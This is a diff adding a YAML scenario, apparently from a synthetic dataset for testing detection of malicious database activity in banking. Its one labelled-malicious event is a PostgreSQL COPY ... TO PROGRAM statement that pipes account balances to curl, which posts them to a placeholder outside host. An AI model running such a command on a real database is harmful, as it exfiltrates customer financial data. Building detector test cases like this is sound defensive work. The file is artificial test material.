@@ -1,0 +1,30 @@
+scenario_id: gen_banking_34_copy_to_program_mal_862m
+family_id: gen_banking_34_copy_to_program_fam_862
+domain: banking
+time_of_day: 03:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT balance FROM accounts) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 45.77.104.123
+      port: 443
+matched_pair_id: gen_banking_34_copy_to_program_pair_862
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
